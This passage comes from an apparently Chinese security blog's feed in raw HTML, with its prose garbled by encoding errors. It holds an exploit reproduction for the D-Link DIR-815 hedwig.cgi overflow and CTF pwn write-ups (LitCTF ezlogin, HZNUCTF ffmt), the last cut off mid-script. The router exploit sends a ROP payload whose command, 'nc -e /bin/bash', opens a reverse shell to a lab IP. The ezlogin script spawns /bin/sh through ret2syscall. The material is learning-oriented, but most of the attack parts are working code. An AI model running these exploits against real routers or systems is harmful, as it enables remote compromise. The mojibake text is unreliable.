class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">rm</span> -rf /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/hnap</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">ln</span> -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><p>æœ€åè¿›åˆ° <code>/squashfs-root/sbin</code> ç›®å½•ä¸‹ï¼Œæ‰§è¡Œ <code>./httpd -f /root/squashfs-root/http_conf</code></p><p>åœ¨å®¿ä¸»æœºä¸­è®¿é—® <code>http://10.214.140.139/hedwig.cgi</code> å‘ç°å¯ä»¥æ­£å¸¸è®¿é—®äº†ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223749.png" alt="image-20240425215457410"></p><p>è¿™æ˜¯ä¸ºäº†ä¹‹åçš„æ‰“expåšå‡†å¤‡</p><p>å¼€å¯ <code>httpd</code> æœåŠ¡åï¼Œå¦‚æœè¦è¿›è¡Œè°ƒè¯•åˆ™éœ€è¦ä¸‹è½½ä¸€ä¸ª <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">gdbserver.mipsle</a> ï¼Œç„¶åå†ç”¨ <code>scp</code> å‘½ä»¤å°†å…¶ä¸Šä¼ åˆ° <code>qemu</code> ä¸­çš„ <code>/root/squashfs-root/</code> ç›®å½•ä¸‹ã€‚</p><p>åœ¨ <code>qemu</code> ä¸­ <code>/root/squashfs-root/</code> ç›®å½•ä¸‹æ–°å»º <code>run.sh</code> è„šæœ¬ï¼ˆ<code>IP</code> æ”¹æˆå®¿ä¸»æœºçš„ï¼Œç«¯å£ï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;11&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_URI=<span class="string">&quot;2333&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;winmt=pwner&quot;</span>|./gdbserver.mipsle 10.214.140.140:7788 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="comment">#echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span></span><br><span class="line"><span class="built_in">unset</span> CONTENT_LENGTH</span><br><span class="line"><span class="built_in">unset</span> CONTENT_TYPE</span><br><span class="line"><span class="built_in">unset</span> HTTP_COOKIE</span><br><span class="line"><span class="built_in">unset</span> REQUEST_METHOD</span><br><span class="line"><span class="built_in">unset</span> REQUEST_URI</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæˆ‘æŠ¥äº†ä¸€ä¸ªé”™è¯¯ï¼Œè·ŸZIKH26å¸ˆå‚…ä¸€æ ·</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223750.png" alt="image-20240425215625540" style="zoom:50%;" /><p>ZIKH26å¸ˆå‚…è¯´å¯èƒ½æ˜¯pwndbgå¯¹æ•°æ®åŒ…çš„è§£æï¼ˆæ¨æµ‹</p><p>æˆ‘åŸæœ¬çš„æƒ³æ³•æ˜¯å°†gdbæ•´ä¸ªçš„ç‰ˆæœ¬é™ä½åˆ°å¯¹åº”çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯å› ä¸ºæ“ä½œé—®é¢˜å°±æç½®äº†ã€‚ã€‚ã€‚å¦‚æœæœ‰äººæ‰¾åˆ°è§£å†³æ–¹æ³•å¸Œæœ›èƒ½æ•™ä¸€ä¸‹æˆ‘ï¼ˆæœ¬äººçº¯èœ</p><p>è¿™é‡Œæ˜¯ç›´æ¥è¿è¡Œhedwig.cgiçš„åŒæ—¶è¿˜cat &#x2F;proc&#x2F;pid&#x2F;mapså¾—åˆ°çš„å†…å­˜å¸ƒå±€</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223751.png" alt="image-20240425220116640" style="zoom:50%;" /><p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„libcç‰ˆæœ¬å¥½åƒè·Ÿç½‘ä¸Šçš„å¸ˆå‚…æœ‰å‡ºå…¥ï¼Œå¯¼è‡´libcåŸºå€ä¸ä¸€æ ·</p><p>å…ˆæ˜¯<code>nv -lvnp 8888</code>ï¼Œç„¶åè¿è¡Œä»¥ä¸‹XPå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.121.128 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x2aadc000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.121.128/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä¸€ç›´æ‰“ä¸é€šï¼Œæˆ–è®¸æ˜¯libcåŸºå€çš„é—®é¢˜ã€‚ã€‚ã€‚ã€‚ã€‚å› ä¸ºæ— æ³•è°ƒè¯•æ‰€ä»¥å°±ã€‚ã€‚ã€‚ã€‚ã€‚æ²¡æ³•å­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DIR-815&quot;&gt;&lt;a href=&quot;#DIR-815&quot; class=&quot;headerlink&quot; title=&quot;DIR-815&quot;&gt;&lt;/a&gt;DIR-815&lt;/h1&gt;&lt;p&gt;ä»”ç»†ç ”è¯»äº†winmtå¸ˆå‚…å’ŒZIKH26å¸ˆå‚…çš„å¤ç°ï¼Œç°åœ¨è‡ªå·±æ¥å¤ç°ä¸€é&lt;/p&gt;
&lt;h2 id=&quot;æ¼æ´è¯¦</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>é¢˜å½•1.1</title>
    <link href="http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/"/>
    <id>http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/</id>
    <published>2024-05-14T13:14:41.000Z</published>
    <updated>2024-05-14T13:17:32.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åˆ·é¢˜è®°å½•2"><a href="#åˆ·é¢˜è®°å½•2" class="headerlink" title="åˆ·é¢˜è®°å½•2"></a>åˆ·é¢˜è®°å½•2</h1><h1 id="LitCTF-2023-ezlogin"><a href="#LitCTF-2023-ezlogin" class="headerlink" title="[LitCTF 2023]ezlogin"></a>[LitCTF 2023]ezlogin</h1><p>é¦–å…ˆæ˜¯ç¬¦å·è¡¨çš„æ¢å¤ï¼Œå°†éšä¾¿ä¸€ä¸ªlibc.soçš„i64æ–‡ä»¶ï¼Œæ‹–åˆ°bindiffé‡Œï¼Œç„¶åimportå³å¯æ¢å¤å¤§éƒ¨åˆ†çš„å‡½æ•°</p><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuffer(off_6B97A8, <span class="number">0LL</span>);</span><br><span class="line">  setbuffer(off_6B97A0, <span class="number">0LL</span>);</span><br><span class="line">  setbuffer(off_6B9798, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !vlun(&amp;v5, <span class="number">0LL</span>, v3) )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodTime.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">vlun</span><span class="params">(<span class="type">int</span> v5, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">536</span>]; <span class="comment">// [rsp+0h] [rbp-218h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, v4, <span class="number">0x200</span>uLL) &gt; <span class="number">0x50</span>u )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  j_strcpy(*&amp;v5, v4);                           <span class="comment">// v5=v4</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(v4, <span class="string">&quot;PASSWORD&quot;</span>) == <span class="number">0</span>;           <span class="comment">// ä¸æˆç«‹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°v5å¤„æœ‰ä¸ªæ ˆæº¢å‡ºï¼Œå¯ä»¥å®ç°ret2syscall</p><p>å…¶ä¸­çš„é™åˆ¶readå‘ç°æ±‡ç¼–</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400C07 3C 50                         cmp     al, 50h <span class="comment">; &#x27;P&#x27;</span></span><br><span class="line">.text:0000000000400C09 77 33                         ja      short loc_400C3E</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯å¦‚æœal&gt;50hçš„è¯å°±ä¼šexitï¼Œè€Œæ˜¾ç„¶alåªæœ‰ä¸€ä¸ªå­—èŠ‚8ä½ï¼Œæ‰€ä»¥åªè¦åˆšå¥½å½“al&#x3D;0çš„æ—¶å€™å³ä»–çš„ä½ä½&lt;&#x3D;50hå³å¯ï¼ˆå­¦åˆ°äº†ï¼Œè¿˜å¯ä»¥è¿™æ ·æ</p><p>æ¥ä¸‹æ¥å°±æ˜¯è¦æ€è€ƒå¦‚ä½•ç»•è¿‡strcpyçš„\x00æˆªæ–­äº†ï¼Œå› ä¸ºæˆ‘ä»¬çš„ropé“¾æ˜¾ç„¶ä¼šæœ‰å¤§é‡çš„\x00</p><p>å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿæœ‰ä¸€ä¸ªæ€è·¯å°±æ˜¯å…ˆæŠŠå·²ç»æ„é€ å¥½çš„ropé“¾å°†\x00éƒ½æ›¿æ¢æˆAä¼ è¿›å»ï¼Œç„¶åå†ä¸€å­—èŠ‚ä¸€å­—èŠ‚æ›´æ”¹ä½\x00</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">content</span>):</span><br><span class="line">    content = content + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    content = content[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content)):</span><br><span class="line">        <span class="keyword">if</span> content[i] == <span class="number">0</span>:</span><br><span class="line">            payload = content[i+<span class="number">1</span>:][-<span class="number">1</span>::-<span class="number">1</span>].replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">            log.success(<span class="string">&#x27;Payload: &#x27;</span> + (<span class="built_in">str</span>(payload)))</span><br><span class="line">            io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, padding + payload)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬ä¸»è¦æ˜¯ç»•è¿‡\x00æˆªæ–­çš„ï¼Œç„¶åä»–æ˜¯å…ˆæŠŠpayloadçš„\x00éƒ½æ¢æˆAï¼Œç„¶åå°†payloadå€’ç½®è¿‡æ¥ï¼Œä¹‹åæ‰¾åˆ°ç¬¬ä¸€ä¸ª\x00å°†å…¶ä¹‹åçš„ï¼Œå³å€’ç½®è¿‡æ¥çœ‹å°±æ˜¯æ‰¾åˆ°æœ€åä¸€ä¸ª\x00å°†å…¶çš„ä¹‹å‰æ‰€æœ‰çš„\x00éƒ½æ›¿æ¢ä¸ºAç„¶åè¾“å…¥ï¼Œä¹‹åå°±æ˜¯ä»\x00ä¹‹å‰å†å¯»æ‰¾æœ€åä¸€ä¸ª\x00ä¸€ç›´é‡å¤æ‰¾ï¼Œå°±å¯ä»¥å°†æ‰€æœ‰çš„å­—èŠ‚è¾“å…¥è¿›å»è¾£ï¼Œï¼ˆä½¿æˆ‘çš„å¤§è„‘æ— é™æ—‹è½¬</p><p>ä¹‹åçš„ropé“¾å°±å¾ˆç®€å•æ„é€ äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ezlogin&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node5.anna.nssctf.cn&#x27;,29142)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezlogin&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bamboo/glibc-all-in-one-master/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Max Padding size : 0x100 - 0x150</span></span><br><span class="line"><span class="comment"># Define registers</span></span><br><span class="line">rax = <span class="number">0x4005AF</span></span><br><span class="line">rdi = <span class="number">0x400706</span></span><br><span class="line">rsi = <span class="number">0x410043</span></span><br><span class="line">rdx = <span class="number">0x448C95</span></span><br><span class="line">syscall = <span class="number">0x448D5F</span></span><br><span class="line">bss = <span class="number">0x6BB300</span></span><br><span class="line">main = <span class="number">0x4005C0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create func use to replace &#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">content</span>):</span><br><span class="line">    content = content + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    content = content[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content)):</span><br><span class="line">        <span class="keyword">if</span> content[i] == <span class="number">0</span>:</span><br><span class="line">            payload = content[i+<span class="number">1</span>:][-<span class="number">1</span>::-<span class="number">1</span>].replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">            log.success(<span class="string">&#x27;Payload: &#x27;</span> + (<span class="built_in">str</span>(payload)))</span><br><span class="line">            io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, padding + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage one</span></span><br><span class="line"><span class="comment"># read(0, 0, bss)</span></span><br><span class="line"><span class="comment"># rax ç³»ç»Ÿè°ƒç”¨å· 0ä»£è¡¨ read</span></span><br><span class="line"><span class="comment"># rdi ç¬¬ä¸€å‚æ•°</span></span><br><span class="line"><span class="comment"># 0 fd</span></span><br><span class="line"><span class="comment"># rsi ç¬¬äºŒå‚æ•°</span></span><br><span class="line"><span class="comment"># bss /bin/sh åœ°å€</span></span><br><span class="line"><span class="comment"># æ­¤å¤„æ— æ³•å¡«å†™rdxçš„å¯„å­˜å™¨ä¸å€¼ï¼Œå› ä¸ºå¦‚æœå¡«å†™äº†ä¼šå¯¼è‡´Payloadæº¢å‡ºï¼Œa1å¯„å­˜å™¨ä¸º58ï¼Œå°±ä¼šè¿›å…¥exitå‡½æ•°ã€‚</span></span><br><span class="line"><span class="comment"># ä½†æ˜¯ç¨‹åºåœ¨æ­¤æ—¶çš„rdxå€¼å¤Ÿå­˜æ”¾å¾ˆå¤šæ•°æ®ï¼Œæ‰€ä»¥å­˜æ”¾ä¸€ä¸ª/bin/shä¸æ˜¯ä»€ä¹ˆéš¾äº‹ã€‚</span></span><br><span class="line">debug()</span><br><span class="line">Payload = p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi) + p64(bss) + p64(syscall) + p64(main)</span><br><span class="line">gadget(Payload)</span><br><span class="line">Payload = <span class="string">b&#x27;PASSWORD\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, Payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage two</span></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line"><span class="comment"># rax ç³»ç»Ÿè°ƒç”¨å· 59ä»£è¡¨ execve</span></span><br><span class="line"><span class="comment"># rdi ç¬¬ä¸€å‚æ•°</span></span><br><span class="line"><span class="comment"># bss /bin/sh åœ°å€</span></span><br><span class="line"><span class="comment"># rsi ç¬¬äºŒå‚æ•°</span></span><br><span class="line"><span class="comment"># 0 NULL</span></span><br><span class="line"><span class="comment"># rdx ç¬¬ä¸‰å‚æ•°</span></span><br><span class="line"><span class="comment"># 0 NULL</span></span><br><span class="line">Payload = p64(rax) + p64(<span class="number">59</span>) + p64(rdi) + p64(bss) + p64(rsi) + p64(<span class="number">0</span>) + p64(rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">gadget(Payload)</span><br><span class="line">Payload = <span class="string">b&#x27;PASSWORD\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, Payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="HZNUCTF-2023-preliminary-ffmt"><a href="#HZNUCTF-2023-preliminary-ffmt" class="headerlink" title="[HZNUCTF 2023 preliminary]ffmt"></a>[HZNUCTF 2023 preliminary]ffmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115387.png" alt="image-20240512200725094"></p><h2 id="é™æ€åˆ†æ-1"><a href="#é™æ€åˆ†æ-1" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HCNUCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, hell0, please say something about yourself~&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªï¼Œç¨‹åºä¸­æœ‰ä¸ªbackdoorï¼Œå› æ­¤æƒ³çš„æ˜¯æ”¹å°¾å·´ä¸€ä¸ªå­—èŠ‚åˆ°backdoorï¼Œå› æ­¤å°±èƒ½æƒ³åˆ°ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆåœ°å€ï¼Œç„¶åç¬¬äºŒä¸ªç›´æ¥æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./ffmt&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span 